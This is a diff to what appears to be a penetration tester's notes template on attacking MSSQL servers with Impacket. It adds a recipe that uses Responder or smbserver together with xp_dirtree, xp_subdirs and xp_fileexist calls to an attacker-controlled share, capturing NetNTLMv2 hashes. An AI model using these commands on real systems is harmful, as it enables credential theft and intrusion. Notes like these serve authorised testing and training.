@@ -2,6 +2,7 @@
 **Using some Impacket tools**
 
 ## Connecting
+(If using kali try `impacket-mssqlclient`)
 ```bash
 mssqlclient.py <user>@<% tp.frontmatter.target_ip %> -windows-auth
 ```
@@ -61,4 +62,34 @@ RECONFIGURE
 ```bash
 xp_cmdshell "whoami"
 ```
+
+### Capturing NETNTLMV2 Hash
+#### Capture hash
+On your machine (If using kali try `impacket-smbserver`)
+```bash
+sudo smbserver.py share ./ -smb2support
+```
+
+```bash
+sudo responder -I tun0
+```
+
+#### Send the Hash
+A couple different ways to send a hash (These are done within MSSQL)
+```bash
+xp_dirtree '\\<% tp.frontmatter.my_ip %>\pwn'
+```
+
+```bash
+exec master.dbo.xp_dirtree '\\<% tp.frontmatter.my_ip %>\pwn'
+```
+
+```bash
+EXEC master..xp_subdirs '\\<% tp.frontmatter.my_ip %>\pwn'
+```
+
+```bash
+EXEC master..xp_fileexist '\\<% tp.frontmatter.my_ip %>\pwn'
+```
+
 
